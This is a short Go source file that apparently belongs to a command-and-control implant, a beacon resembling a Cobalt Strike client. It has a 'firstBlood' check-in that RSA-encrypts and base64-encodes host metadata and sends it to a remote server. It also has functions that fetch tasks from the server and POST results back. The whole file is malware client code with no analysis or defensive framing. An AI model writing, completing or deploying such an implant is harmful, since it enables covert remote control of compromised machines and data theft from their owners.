package internal

import (
	"belin/encrypt"
	"belin/metadata"
	"belin/requester"
	"encoding/base64"
	"encoding/hex"
	"log"
	"net/http"
)

func firstBlood(enc *encrypt.Enc, mt *metadata.Metadata, r *requester.ReqProfile) (bool, error) {
	data := mt.CompMetadata(enc.GlobalKey)
	log.Println(hex.EncodeToString(data))

	rsaEncData, err := enc.RsaEnc(data)
	if err != nil {
		return false, err
	}

	b64RsaEncData := base64.StdEncoding.EncodeToString(rsaEncData)

	mt.EncMetadata = b64RsaEncData
	resp, err := r.Get(b64RsaEncData)
	if err != nil {
		return false, err
	}

	log.Printf("firstblood %v\n", resp)
	return true, nil
}

func callTask(mt *metadata.Metadata, r *requester.ReqProfile) (*http.Response, error) {
	resp, err := r.Get(mt.EncMetadata)
	if err != nil {
		return nil, err
	}

	return resp, nil
}


func sendResult(r *requester.ReqProfile, data []byte) (*http.Response, error) {
	return r.Post(data)
}